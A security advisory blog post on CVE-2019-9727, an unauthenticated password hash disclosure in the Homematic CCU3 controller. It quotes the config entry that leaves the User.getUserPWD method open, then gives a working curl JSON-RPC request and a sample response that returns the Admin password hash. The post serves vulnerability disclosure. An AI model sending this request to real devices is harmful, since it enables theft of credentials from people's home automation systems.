---
layout: post
title: "CVE-2019-9727: Unauthenticated password hash disclosure in Homematic CCU3"
date:   2019-03-26 10:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Overview

- Vendor: eQ-3 AG
- Product: Homematic CCU3
- Version: 3.43.15
- Vulnerability: Unauthenticated password hash disclosure

# Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's website:
"The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures."

# Issue Description

While analyzing the implementation of the CCU3, an Unauthenticated Password Hash Disclosure vulnerability has been identified, which can be exploited in order to retrieve the password hashes of all existing user accounts. This vulnerability can be exploited by unauthenticated attackers with access to the web interface. The system provides a JSON-RPC API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.

A code review of the file `/www/api/methods.conf` revealed that the `User.getUserPWD` method can be used without authentication:

~~~
User.getUserPWD {
  LEVEL NONE
  SCRIPT_FILE user/getuserpwd.tcl
  INFO {Gibt UserPWD zurück}
  ARGUMENTS {_session_id_ userID}
}
~~~

Exemplary request with a non-authenticated SID:

~~~ http
curl -X POST -k -i 'https://1.1.1.1/api/homematic.cgi' --data '{
  "version": "1.1",
  "method": "User.getUserPWD",
  "params": {
    "_session_id_": "@MagZdAHu8d@",
    "userID": "Admin"
  }
}'
~~~

Response of the Homematic CCU3:

~~~
{
  "version": "1.1",
  "result": {
      "UserPWD": "c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec"
  }.UserPWD,
  "error": null
}
~~~

# CVE

[CVE-2019-9727](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9727)

# CVSSv3 Base Score

CVSS Base Score: __5.9__

CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

# Credit

Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Torsten Löbner of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Pascal Keul of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Lukas Zorn of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
